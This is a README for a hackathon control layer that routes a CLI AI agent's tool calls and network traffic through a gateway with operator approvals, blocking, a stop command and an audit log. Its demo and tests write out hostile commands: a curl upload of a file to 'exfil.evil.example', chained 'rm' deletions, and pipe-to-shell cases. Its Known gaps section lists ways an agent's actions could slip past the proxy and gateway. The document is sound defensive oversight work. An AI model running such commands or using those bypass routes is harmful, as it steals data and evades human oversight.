# A10 Agent Harness: a control layer for CLI agents

Hackathon track A10, Prompt 2: "Build a control layer for desktop and
CLI-based AI agents that routes requests through a central gateway. Demo:
launch a CLI agent, display its traffic, block a disallowed action, and stop
the run."

One command starts a gateway, a proxy and a CLI agent. Every tool call the
agent makes (through OpenHarness's tool hook, or the scripted demo agent) and
every network request that goes through the proxy is judged by the gateway
against a 28-row mode table ([MODES.md](MODES.md)) before it runs. Risky
actions wait for the operator in a terminal console. Disallowed actions are
blocked with a reason the model can read. `s` stops the run and kills the
agent. Everything lands in a hash-chained audit log. What the harness cannot
see is listed under [Known gaps](#known-gaps).

Scope: CLI agents only. Desktop apps are out of scope, but row 27 of the
mode table covers the desktop actions a CLI agent can take (screenshots,
clipboard, `osascript`).

## Run it

### Prerequisites

- Python 3.11 (built and tested with 3.11.11). The offline demo uses only the
  standard library: no `pip install`, no network.
- Built and tested on macOS. Linux should work (desktop notifications are
  macOS only) but has not been tested.
- Ports 8000 (gateway) and 8080 (proxy) free, or pass `--port` and
  `--proxy-port`.

### Offline demo (one terminal)

```bash
git clone https://github.com/jfjustin/A10-1.git
cd A10-1
python3 harness.py demo
```

`python3 harness.py` with no subcommand also runs the demo.

The scripted agent (`agent.py`) starts behind the gateway and the proxy, and
the operator console runs in the same terminal. The agent's output is
prefixed with `agent │`; the console's lines start with a time stamp.

1. The startup lines print the gateway, proxy and dashboard URLs. The
   dashboard URL ends in `#token=...`; open it in a browser if you want the
   web view as well.
2. The agent lists and reads `demo-files/`: both are allowed.
3. The agent wants to write `demo-files/summary.md`. The console prints an
   `APPROVAL NEEDED p1` box, rings the bell and sends a notification. Type
   `a` and press Enter.
4. The agent fetches `http://api.example.com/status`. The gateway allows the
   bash command (row 8) and the proxy allows the request (NET row 8) and
   answers it with an offline stub.
5. The agent tries `rm demo-files/notes.txt`, an upload of `notes.txt` to
   `exfil.evil.example`, and `ls demo-files; rm demo-files/notes.txt`. All
   three are blocked, each with its row and reason on screen.
6. The agent re-reads `notes.txt` (still there) and prints its summary.
   Type `s` and press Enter. The run stops (the agent is killed if it is
   still running) and the harness prints the run summary:
   `Run summary: audit chain ✓ verified (12 entries): ...`.

Without `mitmdump` installed, the demo prints one line saying it uses the
stdlib proxy, and carries on. The demo writes `audit.log.jsonl` in the repo
root and, when you approve the write, `demo-files/summary.md`. Both are
git-ignored. The operator token is created in `~/.a10-harness/` (set
`A10_HOME` to use another directory).

Demo flags: `--mode plan|default|auto` (default `default`),
`--proxy auto|stdlib|mitm` (default `auto`: mitm when `mitmdump` is on PATH),
`--port`, `--proxy-port`, `--no-notify`, `--delay SECONDS` (between agent
steps, default 1.2), `--approval-wait SECONDS` (default 590),
`--audit-log PATH`.

### OpenHarness (`oh`) under the gateway (needs network)

[OpenHarness](https://github.com/HKUDS/OpenHarness) (`oh`) is the universal
agent here: it works with Claude or Codex subscriptions, Copilot, any
Anthropic- or OpenAI-compatible API key, and local Ollama. Install it and
mitmproxy, then pick a provider profile:

```bash
pip install openharness-ai mitmproxy
oh provider use <profile>
```

See the OpenHarness README for provider setup; the harness reads whichever
profile is active.

Terminal 1, the agent (one prompt with `-p`, or leave out `-- -p ...` for an
interactive session):

```bash
python3 harness.py oh --workspace ~/code/my-project -- -p "Summarize this repo"
```

Terminal 2, the operator console:

```bash
python3 harness.py watch
```

What the harness does:

- Writes an oh config directory in `~/.a10-harness/oh-config/` with your
  `~/.openharness/settings.json` plus two HTTP hooks that call the gateway:
  `pre_tool_use` (timeout 600 s, blocks the tool when the gateway does not
  answer 2xx, runs first) and `post_tool_use`. Your own oh settings are
  copied, never modified. Changes oh saves during the run (for example a model
  switch) go to the copy and are not kept.
- Starts `oh --permission-mode full_auto` so the gateway is the only approver.
  oh's own sensitive-path check still runs as a second layer.
- Reads the provider host from oh's active profile and allows only that host
  (row 10). Override it with `--provider-host HOST`.
- Keeps the gateway up after oh exits, so you can still read the console and
  dashboard. Stop with `s` in the console or Ctrl-C. Pass `--exit-with-agent`
  to shut down when oh exits.

`--workspace` defaults to the current directory. If you point it at this repo,
only `demo-files/` is writable; the harness's own files are row 18. If the
gateway is not on port 8000, start the console with
`python3 harness.py watch --gateway http://127.0.0.1:<port>` (the harness
prints this hint).

Without `oh` on PATH, `harness.py oh` prints
`oh not found. Install OpenHarness with: pip install openharness-ai` and
exits with code 2.

### Other CLI agents: network monitoring only

```bash
python3 harness.py run --provider-host api.anthropic.com -- claude
```

Any command after `--` runs behind the proxy. Its tool calls are not hooked,
so only its network traffic is judged. Pass the agent's LLM API host with
`--provider-host`; without it every new connection to that API is judged
like any other unknown host (a row 9 ask in default mode). Same flags as `oh`.

### Verify an audit log

```bash
python3 harness.py verify audit.log.jsonl
```

Prints `audit chain ✓ verified (N entries)` and exits 0, or names the first
broken entry and exits 1.

### Tests

```bash
python3 -m unittest discover -s tests -v
python3 -m pytest -q tests        # same tests, if pytest is installed
```

The tests use ephemeral ports and a temporary `A10_HOME`, so they never touch
your `~/.a10-harness` or the repo's audit log. Four tests need the real
mitmproxy or oh and are skipped when those are not installed.

## What it does

```
  operator: terminal console (harness.py demo / watch) + browser dashboard
       |  approve, deny, stop, change mode, override
       |  (control endpoints need the X-A10-Operator-Token header)
       v
  +-------------------- gateway.py (127.0.0.1:8000) --------------------+
  |  policy.py: the mode table         audit.py: hash-chained audit log |
  +---------------------------------------------------------------------+
       ^                                         ^
       | POST /hooks/oh                          | POST /net/judge
       | (pre_tool_use, before every tool call)  | (every proxied request)
       |                                         |
  CLI agent: oh, or agent.py --HTTP(S)_PROXY--> mitmproxy + mitm_addon.py
                                                (or the stdlib proxy.py), :8080
                                                       |
                                                       v  allowed requests only
                                                  the internet
```

- **Tool calls.** Before oh runs a tool it POSTs the call to the gateway's
  `/hooks/oh`. The gateway classifies it against the mode table
  (`policy.py`). Allow answers 200 and the tool runs. Block answers 403 with
  a plain-text reason, which oh hands to the model as the tool error. Ask
  holds the request open until the operator answers or the approval wait runs
  out, then fails closed. `post_tool_use` scans the tool output for secrets
  and marks the run tainted when it finds one. The demo agent `agent.py`
  sends the same payloads, so the gateway cannot tell it apart from oh.
- **Network.** The agent's `HTTP_PROXY`/`HTTPS_PROXY` point at the proxy.
  mitmproxy with `mitm_addon.py` decrypts HTTPS and sends method, URL,
  redacted headers, body size and secret-pattern hits for every request to
  `/net/judge`. The stdlib `proxy.py` is the install-free fallback: it sees
  plain HTTP fully and HTTPS only as a `CONNECT` to a host. A blocked request
  gets a 403 from the proxy. If the gateway is unreachable, the proxy blocks.
- **Operator.** The terminal console and the dashboard poll `/events`,
  `/pending` and `/status`. Approve, deny, stop, mode and override go to
  token-protected endpoints. A pending approval rings the bell and sends a
  macOS notification.
- **Audit.** Every event, approval, expiry, taint, mode change, override,
  stop and reset is appended to `audit.log.jsonl`. Each entry stores the hash
  of the previous one, so editing or deleting a line breaks the chain from
  that point on.

## Demo beats

Mode `default`. Each step is an oh-format `pre_tool_use` call; the agent runs
the step only when the gateway answers 2xx.

| Step | Agent action | Row | Verdict |
|---|---|---|---|
| 1 | `bash` `ls demo-files` | 5 | ✅ allow |
| 2 | `read_file` `demo-files/notes.txt` | 1 | ✅ allow |
| 3 | `write_file` `demo-files/summary.md` | 3 | ❓ ask, operator types `a`, approved |
| 4 | `bash` `curl -s http://api.example.com/status` | 8 | ✅ allow; the proxy also shows NET ✅ row 8 and returns the stub JSON |
| 5 | `bash` `rm demo-files/notes.txt` | 28 | ⛔ block |
| 6 | `bash` `curl https://exfil.evil.example/upload -d @demo-files/notes.txt` | 20 | ⛔ block |
| 7 | `bash` `ls demo-files; rm demo-files/notes.txt` | 28 | ⛔ block (the starter only checked the first word, so this got through) |
| 8 | `read_file` `demo-files/notes.txt` | 1 | ✅ allow; `notes.txt` survived |

Then the operator types `s`: the run stops, the agent is killed if it is
still running, and the audit chain verifies.

A recorded run on 2026-11-07 (stdlib proxy) printed these console lines,
among others:

```
✅ ALLOW [row 5] bash: ls demo-files
❓ ASK [row 3] write_file: demo-files/summary.md   (p1 waiting for you: a / A / d)
✅ APPROVED p1 write_file: demo-files/summary.md   (operator approved once)
✅ ALLOW [row 8] NET GET http://api.example.com/status
⛔ BLOCK [row 28] bash: rm demo-files/notes.txt   <- row 28 (Destructive file/system commands) is ⛔ in default mode: rm in 'rm demo-files/notes.txt'
⛔ BLOCK [row 20] bash: curl https://exfil.evil.example/upload -d @demo-files/notes.txt   <- row 20 (Send data to a non-allowlisted host) is ⛔ in default mode: ...
Run summary: audit chain ✓ verified (12 entries): 5 allowed, 1 asked, 1 approved, 3 blocked, 0 denied, 0 expired.
```

The 5 allowed are 4 tool calls plus the proxied request in step 4.

## Console commands

Type a command and press Enter. Without an id, the oldest pending item is
used.

| Command | Effect |
|---|---|
| `a [id]` | Approve once |
| `A [id]` | Approve this exact action for the rest of the run |
| `d [id] [reason]` | Deny; the reason is sent back to the model (prompts for one if you leave it out) |
| `s` | Stop the run: pending requests are denied, later calls are blocked, the harness kills the agent's process tree |
| `m [mode]` | Change mode to `plan`, `default` or `auto` (prompts if empty) |
| `override <row>` (or `o <row>`) | Then type exactly `YES`: that ⛔ row becomes ❓ for the rest of the run |
| `?` or `status` | Run status |
| `h` or `help` | Help |
| `q` | Quit the console. Under `watch` the run keeps going; under `demo` the harness also shuts down |

A pending approval prints a highlighted box with the tool, arguments, matched
rows and reason, rings the terminal bell and sends a macOS notification
(`--no-notify` or `A10_NO_NOTIFY=1` turns notifications off). It waits until
you answer, up to the approval wait (590 s), then fails closed as expired.

The dashboard at the printed `http://127.0.0.1:8000/#token=...` URL shows the
same live table, counters, mode, taint state, overrides and audit status. With
the token it has Approve once, Approve for run, Deny (with a reason) and
STOP RUN buttons. Without the token it is read-only. Mode changes and
overrides are console-only.

## Modes and settings

Three modes: `plan` (read-only), `default` (reads run, changes pause, used
for the demo) and `auto` (workspace changes run, actions outside it pause).
The full 28-row table, the precedence rules and the planner's stricter
additions are in [MODES.md](MODES.md).

| Setting | Default | How to change it |
|---|---|---|
| `taint_tracking` | on | `python3 gateway.py --no-taint` (manual gateway only) |
| `clean_url` | on in auto | `python3 gateway.py --no-clean-url` (manual gateway only) |
| `provider_host` | from oh's active profile | `--provider-host HOST` (repeatable) |
| allowlist (row 8) | `api.example.com` | `--allowed-host HOST` (repeatable, replaces the default) |
| `approval_wait` | 590 s (oh's hook limit is 600 s) | `--approval-wait SECONDS` |
| `override` | typed `YES` | console only |
| `operator_token` | `~/.a10-harness/operator.token` | set `A10_HOME` |

## Security notes

- **Operator token.** The harness creates `~/.a10-harness/operator.token`
  (directory 0700, file 0600; `A10_HOME` moves it) and tightens wider
  permissions. The gateway requires it in the `X-A10-Operator-Token` header
  for `/approve`, `/stop`, `/mode`, `/override` and `/reset`. The agent never
  sees it: the harness removes every environment variable whose name contains
  `OPERATOR_TOKEN` or starts with `A10_OPERATOR` from the agent's
  environment, and reading the token file is row 16 (⛔ in every mode). The
  dashboard gets the token from the URL fragment (`#token=`), which browsers
  do not send to the server, and keeps it in `sessionStorage`.
- **CA trust for the agent only.** With mitmproxy, the harness builds
  `~/.a10-harness/ca-bundle.pem` (the certifi bundle or `/etc/ssl/cert.pem`,
  plus the mitmproxy CA) and sets `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE` and
  `CURL_CA_BUNDLE` to it, and `NODE_EXTRA_CA_CERTS` to the mitmproxy CA, in
  the agent's environment only. Nothing is added to the macOS keychain. The
  CA private key is in `~/.a10-harness/mitmproxy/`: writing there is row 18
  (⛔), but reading a `.pem` file is row 17 (❓ in default and auto), so do
  not approve agent reads under `~/.a10-harness`.
- **Header and secret redaction.** `Authorization` (the scheme word such as
  `Bearer` is kept), `Proxy-Authorization`, `x-api-key`, `Cookie` and
  `Set-Cookie` values are replaced before they reach the gateway's events,
  the console, the dashboard or the audit log. Strings matching secret
  patterns (`AKIA…`, `sk-…`, `ghp_…`, private key headers and others) are
  replaced with `[REDACTED:<kind>]`, and long strings are truncated.
- **Host-header guard.** The gateway binds to 127.0.0.1 and refuses requests
  whose `Host` header is not `127.0.0.1:<port>` or `localhost:<port>`, so a
  web page cannot reach it through DNS rebinding. The dashboard is served with
  `X-Frame-Options: DENY` and a Content-Security-Policy (`default-src 'none'`,
  `connect-src 'self'`), and renders all agent-controlled text as text, never
  as HTML.
- **The agent cannot reach the gateway's controls.** `NO_PROXY` is set to
  `127.0.0.1,localhost` so oh's hook calls reach the gateway directly. A
  `curl` to `127.0.0.1:8000/reset` from a tool call is row 19 (⛔), and the
  control endpoints need the token anyway. Killing the gateway or the proxy,
  unsetting `*_PROXY` and adding CA certificates are row 18 (⛔).

## Files

| File | Purpose |
|---|---|
| `harness.py` | Launcher: `demo`, `oh`, `run`, `watch`, `verify`; operator token, agent environment, process lifecycle, stop-and-kill |
| `gateway.py` | Gateway HTTP server, approvals, run state, control API, inline dashboard |
| `policy.py` | Mode table (`ROWS`), settings, run state, `classify()` and `decide()` |
| `shellparse.py` | Quote-aware shell splitter used by the policy |
| `netcheck.py` | Host classes, clean-URL test, secret patterns, redaction, demo stubs, gateway client |
| `audit.py` | Hash-chained audit log |
| `console.py` | Terminal operator console |
| `proxy.py` | Stdlib proxy (fallback, no HTTPS decryption) |
| `mitm_addon.py` | mitmproxy addon; the only file that imports mitmproxy |
| `oh_setup.py` | oh config directory with the gateway hooks; provider host detection; `--print-hooks` generates `docker/oh-settings.json` |
| `agent.py` | Scripted offline demo agent that speaks oh's hook format |
| `docker/` | Unverified Docker layout for the row 6 gap: `compose.yml`, `Dockerfile.agent`, `oh-settings.json`, `README.md` |
| `demo-files/notes.txt` | The file the planted `rm` tries to delete |
| `MODES.md` | Mode table, precedence, settings |
| `PITCH_AND_DEVPOST.md` | 60-second pitch and DevPost notes |
| `tests/` | unittest suite (also runs under pytest) |

Runtime files: `audit.log.jsonl` and `demo-files/summary.md` in the repo
(git-ignored), and in `~/.a10-harness/`: `operator.token`, `oh-config/`,
`mitmproxy/`, `ca-bundle.pem`, `run/pids.json`, `run/mitmdump.log`.

## Known gaps

- **Row 6: scripts can act without tool calls.** When the agent runs a
  script (`python x.py`, `npm test`), the gateway judges the command line,
  not what the script does. The script can open sockets or read files such as
  `~/.ssh` without any tool call. The proxy only sees traffic from programs
  that honor the `*_PROXY` environment variables; anything else goes straight
  out. The full fix is to run the agent in a Docker network whose only exit is
  the proxy. [docker/README.md](docker/README.md) describes that layout (the
  agent container on an internal network, mitmproxy as its only exit) and
  lists the commands that check it. It is **unverified**: it was written on
  2026-11-07 without Docker or network, so none of it has run.
- **oh's `web_fetch` and `web_search` ignore the proxy.** oh creates their
  HTTP client with `trust_env=False`, so they skip `*_PROXY` and the CA
  variables. The gateway still judges them at the tool level (URL, host,
  clean-URL and taint checks), but the proxy never sees those requests. The
  harness removes `OPENHARNESS_WEB_PROXY` from oh's environment because TLS
  through mitmproxy would fail without the CA.
- **Node's built-in `fetch` ignores `HTTPS_PROXY`.** Node agents that use it
  instead of a proxy-aware client bypass the proxy, the same way as row 6.
- **The stdlib proxy cannot decrypt HTTPS.** It sees only the `CONNECT` host
  and judges it like a GET to that host (row 9). It cannot see the method,
  path or body, so an HTTPS POST to an unknown host is an ask, not a row 20
  block. In auto mode, an untainted run lets the tunnel through. Use
  mitmproxy for anything beyond the offline demo. Tool-level checks still
  block `curl -d ...` to unknown hosts either way.
- **Row 11 stays ⛔ in every mode** until the subagent test below passes. We
  have not confirmed that tool calls made by oh subagents go through the
  same hooks.
- **Subscription and Copilot provider hosts are unconfirmed.** Row 10 assumes
  `api.anthropic.com` for the Claude subscription, `chatgpt.com` for Codex and
  `api.githubcopilot.com` for Copilot. If a profile uses another host, its
  traffic is judged as an unknown host (an ask in default mode). Pass the
  right host with `--provider-host`.
- **Ollama at the tool level.** The provider entry is `localhost:11434`; a
  tool-level `curl http://127.0.0.1:11434` does not match it and is row 19
  (⛔). oh's own Ollama traffic is not affected because it does not go through
  the proxy (`NO_PROXY` covers localhost).
- **Clients that pin certificates or ignore the CA variables** fail TLS through
  mitmproxy. That shows up as an INFO note on the console, not as a block.
- **Approval waits are capped** at 590 s by default because oh gives up on a
  hook call after 600 s. An unanswered ask then fails closed as expired.

## Verification status

### Verified offline on 2026-11-07

`python3 -m unittest discover -s tests -v`: 211 tests, OK, 4 skipped.
`python3 -m pytest -q tests`: 207 passed, 4 skipped, 81 subtests passed
(about 20 s). The skipped tests are the ones that need the real mitmproxy or
oh.

- `tests/test_policy.py`, `tests/test_shellparse.py`: the row table matches
  the approved table cell by cell; at least one example per row in all three
  modes; the tricky shell cases (`ls; rm`, `$(rm x)`, quote tricks,
  `bash -c`, pipe-to-shell, `base64 -d | sh`, redirects, heredocs); clean-URL
  and taint rules with a fake clock; precedence, overrides with `YES` only,
  approve-for-run, 30 s network passes; harness self-protection.
- `tests/test_gateway.py`, `tests/test_audit.py`: hook allow, block and held
  ask; approve, deny with reason, approve-for-run; expiry fails closed; 401
  on control endpoints without the right token; `/mode`, `/override` (only
  with `YES`), `/stop` releasing waiters; Host-header guard; taint from tool
  output; redaction and truncation in events; audit tamper detection and
  starter-format compatibility.
- `tests/test_proxy.py`: stdlib proxy demo stubs, row 20 block for an
  exfiltration POST, row 19 block for `CONNECT` to 127.0.0.1, credential
  headers never reaching events or the audit log, gateway down blocks.
- `tests/test_console.py`: every console command, the pending box and bell,
  control characters stripped from agent text, notification command built in
  argv form so agent text cannot inject AppleScript.
- `tests/test_harness.py`: token file permissions, agent environment
  (token variables removed, proxy and CA variables set), killing a process
  tree, `harness.py verify`.
- `tests/test_demo_e2e.py`: the full demo flow from "Demo beats" (rows 5, 1,
  3 approved, 8 plus the proxy NET row 8, 28, 20, 28, 1), `notes.txt` intact,
  audit verifies.
- `tests/test_mitm_addon.py`: the mitmproxy addon with fake flow objects:
  stub for `api.example.com`, 403 for a POST to an unknown host, header
  redaction, fail closed on gateway errors, judging by the real destination
  rather than a spoofed `Host` header, raw TCP inside a tunnel, TLS failure
  notes; plus an end-to-end run against a live gateway.
- `tests/test_oh_setup.py`: the oh config directory (hooks first at priority
  1000, user settings kept, `credentials.json` symlinked, user directory
  unchanged, idempotent) and provider host detection for each profile type.
- `tests/test_harness_oh.py`: `harness.py oh` with a fake `oh` on PATH:
  launched with `--permission-mode full_auto`, proxy variables set, no
  operator token in its environment, its hook calls get 403 for `rm` (row 28)
  and 200 for `ls`; stop kills it; missing `oh` exits 2 with the install hint.
- `tests/test_harness_run.py`: `harness.py run -- curl ...` through the stdlib
  proxy (stub allowed as row 8, exfiltration 403 as row 20); `--proxy mitm`
  lifecycle and agent-only CA variables with a fake `mitmdump`; `harness.py
  demo` with piped console input.
- `tests/test_docker_layout.py`: static text checks of `docker/` only (no
  Docker, no PyYAML): the agent service is on the internal `agentnet` only,
  with no operator token, `docker.sock` or harness code mounted; the console
  port is published on 127.0.0.1 only; the gateway command uses real
  `gateway.py` flags and the gateway accepts the `gateway:8000` Host header;
  the mitmdump command matches the harness's; `docker/oh-settings.json` is
  what `oh_setup.py --print-hooks` prints. This does not verify that Docker
  behaves as described; the layout itself is still unverified.
- Manual runs of `python3 harness.py demo` with piped console input (approve
  the write with `a`, then `s`), with a temporary `A10_HOME`: the console
  showed the allow, ask and block lines from "Demo beats", the agent printed
  `Done. 3 action(s) blocked, 1 approved by the operator, 0 denied or
  expired; nothing destructive ran.`, and the summary printed
  `audit chain ✓ verified (12 entries)`. A second run that stopped mid-run
  showed the harness killing the agent's process tree.

### Needs network / not yet verified

- `pip install mitmproxy openharness-ai`, then run the skipped tests
  (`python3 -m pytest -q tests -rs` lists them).
- `python3 harness.py demo --proxy mitm`: HTTPS decryption with the real
  mitmdump, and that the agent-only CA is trusted by curl, Python `requests`
  and Node (`NODE_EXTRA_CA_CERTS`).
- `python3 harness.py oh -- -p "..."` with a real provider: that oh accepts
  the generated hook settings, that the 403 text reaches the model as the
  tool error, that `post_tool_use` arrives, and that oh's LLM traffic is row
  10. Also Ctrl-C and the interactive TUI under the harness.
- Confirm the row 10 hosts for the Claude and Codex subscriptions and for
  Copilot.
- `python3 harness.py run -- claude` and `-- codex` with real agents.
- The row 11 subagent test:
  1. Make a scratch workspace:
     `mkdir -p /tmp/a10-row11 && cp -R demo-files /tmp/a10-row11/`
  2. Start oh interactively under the harness:
     `python3 harness.py oh --workspace /tmp/a10-row11`, and the console in
     a second terminal: `python3 harness.py watch`.
  3. In the console, type `override 11`, then `YES`, so the subagent can be
     started (row 11 becomes ❓ for this run).
  4. Ask oh: "Use a subagent to run `rm demo-files/notes.txt`." Approve the
     `agent` call with `a`.
  5. If the console or dashboard shows the subagent's
     `rm demo-files/notes.txt` as `⛔ BLOCK [row 28]` and
     `/tmp/a10-row11/demo-files/notes.txt` still exists, subagent tool calls
     go through the gateway: flip row 11 to ⛔/❓/✅ in `policy.ROWS` and in
     MODES.md. If the `rm` never appears or the file is gone, keep row 11 ⛔
     in every mode.
- The Docker layout for the row 6 gap
  ([docker/README.md](docker/README.md), unverified): build it, then run the
  ten checks in its "Verify" section (for example, a direct
  `socket.create_connection(('1.1.1.1', 443), 3)` from the agent container
  must fail, and `curl -s https://example.com` from it must show up in the
  console).
- Push to [jfjustin/A10-1 on GitHub](https://github.com/jfjustin/A10-1).
